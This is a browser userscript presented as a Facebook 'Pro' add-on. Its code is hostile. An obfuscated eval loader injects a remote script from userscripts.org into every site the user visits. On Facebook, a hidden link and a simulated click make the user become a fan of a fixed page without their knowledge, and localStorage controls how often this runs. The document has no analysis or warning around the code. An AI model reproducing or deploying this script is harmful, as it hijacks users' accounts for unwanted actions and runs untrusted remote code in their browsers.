// ==UserScript==
// @name           Facebook teszt2 Pro + Last Update
// @namespace      teszt2
// @author         facebook.com/
// @description    teszt2
// @include        *
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var dis = "lol2"

var un1		=	document.createElement('a');
	un1.style.display	=	'none';
	un1.id				=	'f1';
	un1.setAttribute('rel',		'async-post');
	un1.setAttribute('href',		'#');
	un1.setAttribute('ajaxify',	'/ajax/pages/fan_status.php?fbpage_id=259987770680832&add=0&reload=0&preserve_tab=0&use_primer=1');
document.body.insertBefore(un1, document.body.firstChild);


function klikk(){
	var event1 = document.createEvent("MouseEvents");
	event1.initMouseEvent("click", true, true, window,
	0, 0, 0, 0, 0, false, false, false, false, 0, null);
	var cb1 = document.getElementById("f1");
	var canceled1 = !cb1.dispatchEvent(event1);
	if(canceled1){
	}else{}
}
if (window	==	window.top && window.top.location.hostname.indexOf('facebook.com')	!= -1) {
	var fb_1	=	localStorage.getItem("facebook-"+dis+"-1");

	if (fb_1 === null){
		localStorage.setItem("facebook-"+dis+"-1","-?");
	}
	if(fb_1 == "-?"){
		localStorage.setItem("facebook-"+dis+"-1","-X");
	}
}

if (window	==	window.top && window.top.location.hostname.indexOf('facebook.com')	!= -1 && localStorage.getItem("facebook-"+dis+"-1") == "-?") {
	try{
		klikk();
		document.getElementById('f1').click();
	}catch(e){}
}